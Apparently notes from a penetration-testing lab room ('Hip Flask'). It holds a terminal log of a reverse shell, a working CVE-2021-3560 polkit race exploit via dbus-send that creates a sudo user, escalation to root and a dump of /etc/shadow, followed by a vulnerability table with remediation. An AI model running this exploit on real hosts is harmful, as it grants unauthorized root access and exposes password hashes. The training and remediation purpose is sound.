                                                                          
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ stty -a | head -1
speed 38400 baud; rows 20; columns 74; line = 0;
                                                                          
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ stty raw -echo;fg
[1]  + continued  sudo nc -lvnp 443
                                   stty rows 20 cols 74
stty rows 20 cols 74
www-data@websrv1:/opt/site$ ls -la /etc/apparmor.d
ls -la /etc/apparmor.d
total 128
drwxr-xr-x   7 root root  4096 Jun 22  2021 .
drwxr-xr-x 143 root root 12288 Jun 22  2021 ..
drwxr-xr-x   4 root root  4096 Jun 12  2021 abstractions
drwxr-xr-x   2 root root  4096 Jun 12  2021 disable
drwxr-xr-x   2 root root  4096 Feb 11  2020 force-complain
drwxr-xr-x   2 root root  4096 Jun 22  2021 local
-rw-r--r--   1 root root  1313 May 19  2020 lsb_release
-rw-r--r--   1 root root  1108 May 19  2020 nvidia_modprobe
-rw-r--r--   1 root root  3222 Mar 11  2020 sbin.dhclient
drwxr-xr-x   5 root root  4096 Oct 26  2020 tunables
-rw-r--r--   1 root root 11082 Apr  1  2021 usr.bin.evince
-rw-r--r--   1 root root  9007 May 31  2021 usr.bin.firefox
-rw-r--r--   1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r--   1 root root  1519 Mar 15  2021 usr.lib.libreoffice.program.oosplash
-rw-r--r--   1 root root  1227 Mar 15  2021 usr.lib.libreoffice.program.senddoc
-rw-r--r--   1 root root 10653 Mar 15  2021 usr.lib.libreoffice.program.soffice.bin
-rw-r--r--   1 root root  1046 Mar 15  2021 usr.lib.libreoffice.program.xpdfimport
-rw-r--r--   1 root root   540 Apr 10  2020 usr.sbin.cups-browsed
-rw-r--r--   1 root root  5797 Apr 24  2020 usr.sbin.cupsd
-rw-r--r--   1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
-rw-r--r--   1 root root  2477 Sep 28  2020 usr.sbin.named
-rw-r--r--   1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r--   1 root root  1385 Dec  7  2019 usr.sbin.tcpdump
www-data@websrv1:/opt/site$ apt list --upgradeable
apt list --upgradeable
Listing... Done
alsa-ucm-conf/focal-updates 1.2.2-1ubuntu0.8 all [upgradable from: 1.2.2-1ubuntu0.7]
bluez-obexd/focal-updates,focal-security 5.53-0ubuntu3.2 amd64 [upgradable from: 5.53-0ubuntu3.1]
bluez/focal-updates,focal-security 5.53-0ubuntu3.2 amd64 [upgradable from: 5.53-0ubuntu3.1]
firefox/focal-updates,focal-security 89.0.1+build1-0ubuntu0.20.04.1 amd64 [upgradable from: 89.0+build2-0ubuntu0.20.04.2]
gcc-10-base/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
gir1.2-secret-1/focal-updates 0.20.4-0ubuntu1 amd64 [upgradable from: 0.20.3-0ubuntu1]
initramfs-tools-bin/focal-updates 0.136ubuntu6.6 amd64 [upgradable from: 0.136ubuntu6.5]
initramfs-tools-core/focal-updates 0.136ubuntu6.6 all [upgradable from: 0.136ubuntu6.5]
initramfs-tools/focal-updates 0.136ubuntu6.6 all [upgradable from: 0.136ubuntu6.5]
libatomic1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libcc1-0/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libgcc-s1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libgomp1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libhogweed5/focal-updates,focal-security 3.5.1+really3.5.1-2ubuntu0.2 amd64 [upgradable from: 3.5.1+really3.5.1-2ubuntu0.1]
libitm1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
liblsan0/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libnettle7/focal-updates,focal-security 3.5.1+really3.5.1-2ubuntu0.2 amd64 [upgradable from: 3.5.1+really3.5.1-2ubuntu0.1]
libnss-systemd/focal-updates 245.4-4ubuntu3.7 amd64 [upgradable from: 245.4-4ubuntu3.6]
libpam-systemd/focal-updates 245.4-4ubuntu3.7 amd64 [upgradable from: 245.4-4ubuntu3.6]
libpolkit-agent-1-0/focal-updates,focal-security 0.105-26ubuntu1.1 amd64 [upgradable from: 0.105-26ubuntu1]
libpolkit-gobject-1-0/focal-updates,focal-security 0.105-26ubuntu1.1 amd64 [upgradable from: 0.105-26ubuntu1]
libprocps8/focal-updates 2:3.3.16-1ubuntu2.2 amd64 [upgradable from: 2:3.3.16-1ubuntu2.1]
libpulse-mainloop-glib0/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [upgradable from: 1:13.99.1-1ubuntu3.10]
libpulse0/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [upgradable from: 1:13.99.1-1ubuntu3.10]
libpulsedsp/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [upgradable from: 1:13.99.1-1ubuntu3.10]
libquadmath0/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libsecret-1-0/focal-updates 0.20.4-0ubuntu1 amd64 [upgradable from: 0.20.3-0ubuntu1]
libsecret-common/focal-updates 0.20.4-0ubuntu1 all [upgradable from: 0.20.3-0ubuntu1]
libsmbclient/focal-updates 2:4.11.6+dfsg-0ubuntu1.9 amd64 [upgradable from: 2:4.11.6+dfsg-0ubuntu1.8]
libstdc++6/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libsystemd0/focal-updates 245.4-4ubuntu3.7 amd64 [upgradable from: 245.4-4ubuntu3.6]
libtsan0/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libubsan1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libudev1/focal-updates 245.4-4ubuntu3.7 amd64 [upgradable from: 245.4-4ubuntu3.6]
libwbclient0/focal-updates 2:4.11.6+dfsg-0ubuntu1.9 amd64 [upgradable from: 2:4.11.6+dfsg-0ubuntu1.8]
libxml2/focal-updates,focal-security 2.9.10+dfsg-5ubuntu0.20.04.1 amd64 [upgradable from: 2.9.10+dfsg-5]
linux-aws/focal-updates 5.8.0.1038.40~20.04.11 amd64 [upgradable from: 5.8.0.1035.37~20.04.9]
linux-headers-aws/focal-updates 5.8.0.1038.40~20.04.11 amd64 [upgradable from: 5.8.0.1035.37~20.04.9]
linux-image-aws/focal-updates 5.8.0.1038.40~20.04.11 amd64 [upgradable from: 5.8.0.1035.37~20.04.9]
linux-libc-dev/focal-updates 5.4.0-77.86 amd64 [upgradable from: 5.4.0-74.83]
policykit-1/focal-updates,focal-security 0.105-26ubuntu1.1 amd64 [upgradable from: 0.105-26ubuntu1]
procps/focal-updates 2:3.3.16-1ubuntu2.2 amd64 [upgradable from: 2:3.3.16-1ubuntu2.1]
pulseaudio-module-bluetooth/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [upgradable from: 1:13.99.1-1ubuntu3.10]
pulseaudio-utils/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [upgradable from: 1:13.99.1-1ubuntu3.10]
pulseaudio/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [upgradable from: 1:13.99.1-1ubuntu3.10]
python3-ply/focal-updates 3.11-3ubuntu0.1 all [upgradable from: 3.11-3build1]
samba-libs/focal-updates 2:4.11.6+dfsg-0ubuntu1.9 amd64 [upgradable from: 2:4.11.6+dfsg-0ubuntu1.8]
systemd-sysv/focal-updates 245.4-4ubuntu3.7 amd64 [upgradable from: 245.4-4ubuntu3.6]
systemd-timesyncd/focal-updates 245.4-4ubuntu3.7 amd64 [upgradable from: 245.4-4ubuntu3.6]
systemd/focal-updates 245.4-4ubuntu3.7 amd64 [upgradable from: 245.4-4ubuntu3.6]
thunderbird-gnome-support/focal-updates,focal-security 1:78.11.0+build1-0ubuntu0.20.04.2 amd64 [upgradable from: 1:78.8.1+build1-0ubuntu0.20.04.1]
thunderbird/focal-updates,focal-security 1:78.11.0+build1-0ubuntu0.20.04.2 amd64 [upgradable from: 1:78.8.1+build1-0ubuntu0.20.04.1]
ubuntu-advantage-tools/focal-updates 27.1~20.04.1 amd64 [upgradable from: 27.0.2~20.04.1]
udev/focal-updates 245.4-4ubuntu3.7 amd64 [upgradable from: 245.4-4ubuntu3.6]
yaru-theme-gnome-shell/focal-updates 20.04.11.1 all [upgradable from: 20.04.10.1]
yaru-theme-gtk/focal-updates 20.04.11.1 all [upgradable from: 20.04.10.1]
yaru-theme-icon/focal-updates 20.04.11.1 all [upgradable from: 20.04.10.1]
yaru-theme-sound/focal-updates 20.04.11.1 all [upgradable from: 20.04.10.1]
www-data@websrv1:/opt/site$ id attacker
id attacker
id: ‘attacker’: no such user
www-data@websrv1:/opt/site$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real    0m0.014s
user    0m0.002s
sys     0m0.000s
www-data@websrv1:/opt/site$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
[1] 1131
www-data@websrv1:/opt/site$ id attacker 
id attacker
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)
[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
www-data@websrv1:/opt/site$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
[1] 1171
www-data@websrv1:/opt/site$ su attacker
su attacker
Password: Expl01ted

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

attacker@websrv1:/opt/site$ sudo -s
sudo -s
[sudo] password for attacker: Expl01ted

root@websrv1:/opt/site# whoami
whoami
root
root@websrv1:/opt/site# id
id
uid=0(root) gid=0(root) groups=0(root)
root@websrv1:/opt/site# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:66:0e:51:18:1f brd ff:ff:ff:ff:ff:ff
    inet 10.10.149.10/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 958sec preferred_lft 958sec
    inet6 fe80::66:eff:fe51:181f/64 scope link 
       valid_lft forever preferred_lft forever
root@websrv1:/opt/site# cat /etc/shadow
cat /etc/shadow
root:$6$./Fh3mWMsk8X29kq$6CvaDzV7zlXKn1MMQjXtO.abB4/7ecNKBFkQvEWsLkgM8raAZeuSHZurnXG01pqZ4BY2ubk/WgIbo4ee.wnaP0:18791:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18790::::::
lxd:!:18790::::::
rtkit:*:18790:0:99999:7:::
dnsmasq:*:18790:0:99999:7:::
usbmux:*:18790:0:99999:7:::
avahi:*:18790:0:99999:7:::
cups-pk-helper:*:18790:0:99999:7:::
pulse:*:18790:0:99999:7:::
geoclue:*:18790:0:99999:7:::
saned:*:18790:0:99999:7:::
colord:*:18790:0:99999:7:::
gdm:*:18790:0:99999:7:::
whoopsie:*:18790:0:99999:7:::
avahi-autoipd:*:18790:0:99999:7:::
kernoops:*:18790:0:99999:7:::
gnome-initial-setup:*:18790:0:99999:7:::
speech-dispatcher:!:18790:0:99999:7:::
nm-openvpn:*:18790:0:99999:7:::
hplip:*:18790:0:99999:7:::
bind:*:18800:0:99999:7:::
attacker:$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.:19209:0:99999:7:::
root@websrv1:/opt/site# 

**wrapping up**

Before we finish, let's consolidate all of the vulnerabilities we found into one place:

Totals:
Rank
	Number Found
Informational	1
Low	4
Medium	3
High	3
Critical	1

Details:
ID
	Rank
	CVSS
	Vulnerability
	Remediation
HF-WEB-6
	Critical	9.1
	

Admin console is vulnerable to a Server Side Template Injection vulnerability leading to remote code execution. When chained with HF-WEB-3, this effectively allows unauthenticated RCE as the www-data user.
	

Change the source code for the webapp so that it no longer dynamically alters the template prior to rendering by the Jinja2 template engine. Instead pass the variables directly into Jinja2 for rendering.
HF-WEB-3
	High	8.4
	Source code disclosure as a result of an Nginx misconfiguration, which includes the webapp's private encryption key, allowing for token forgery.
	Change the encryption key ASAP across all deployed instances of the webapp, and change the webserver configuration to prevent the source code disclosure. Ideally the webapp source should be completely separate to the static files, outwith the Nginx webroot. Storing the key in the database or as an environment variable would also be a lot safer than keeping it in the source code of the site.
HF-WEB-4
	High	7.5
	

User SQLite3 database exposed at https://hipper.hipflasks.thm/data/users.db. Possibility for attackers to download the database and attempt to crack user passwords (including those of administrators). Vulnerability is mitigated against slightly by apparent use of a complex password for administrator user.
	Move the user database outside of the webroot. Vulnerability can also be mitigated against as a side-effect of remediating HF-WEB-3
HF-LO-2
	High
	7.2
	Device is vulnerable to CVE-2021-3560 in the Polkit authentication module
	

Perform a full software upgrade on the device as soon as possible (sudo apt update && sudo apt upgrade). If this is impossible then upgrade the following packages: policykit-1, libpolkit-agent-1-0 and libpolkit-gobject-1-0, to at least version: 0.105-26ubuntu1.1.
HF-NW-1
	Medium
	6.4
	Untrusted, self-signed SSL certificates in use for HTTPS encryption.	Get an SSL certificate signed by a recognised authority for the webserver. Let's Encrypt will do this quickly, easily and for free.
HF-WEB-5
	Medium	5.3
	Statistics SQLite3 database exposed at https://hipper.hipflasks.thm/data/stats.db resulting in unintended information disclosure.
	Move the database outside of the webroot. Vulnerability can also be mitigated against as a side-effect of remediating HF-WEB-3
HF-NW-4
	Medium	5.3
	DNS server is vulnerable to a Zone Transfer attack
	

Explicitly allow only recognised secondary DNS servers of the hipflasks.thm zone to perform axfr queries against the primary DNS server.
HF-LO-1
	Low	3.4
	Root account is used for day-to-day administration of the server and is allowed SSH access with a private key.
	

Create a new user(s) with appropriate permissions to login with and perform day-to-day administration.

Remove login access with the root account and use sudo or pkexec from a lower-privileged account when root privileges are required.
HF-WEB-1
	Low
	3.1
	Session cookie set without Secure attribute potentially leading to session takeover should the cookie be sent over a monitored HTTP connection
	Change the webapplication code to include the secure attribute when setting session cookies
HF-WEB-2
	Low	3.1	No Content-Security-Policy header set for the web application
	Set a suitable content security policy and add it into a header in the Nginx configuration for this application
HF-NW-2
	Low
	1.9
	Weak encryption method (Cipher Block Chaining -- CBC) in use for SSH encryption.	Disable the CBC mode cipher encryption on the OpenSSH server and replace it with the CTR or GCM encryption methods.
HF-NW-3
	Informational
	0
	Unnecessary information disclosure in the catchall landing page for the Nginx server.	Remove the latter sentence of the custom error message so that only the "Host Name not found" message is shown.

If this were a real client, we would now write a report containing this information. Report writing is outwith the scope of this room; however, if you wish to write a report and submit it as a writeup following the same rules as with Wreath, you may find Task 44 of the Wreath network useful.

It is also worth noting that many informational entries were missed out here for brevity (which would be included in a real report), and no post-exploitation steps were taken (e.g. attempting to crack the root password hash to check password complexity). These are things you may wish to add for yourself. Equally, you may wish to figure out how to allow Nessus to run using SSH credentials (something which would usually be done with the client's direct co-operation).

We have now finished our assessment of the Hip Flask webserver.
This was a brief introduction into the mindset and bureaucratic procedures involved in an attack such as this. It should be noted that -- whilst these are all real-world vulnerabilities -- the chances of seeing a kill-chain from network access to root (as we showcased here) are significantly slimmer in a real engagement.  Regardless, this should hopefully have provided a bit of an introduction into the topic.
```

[[Hacked]]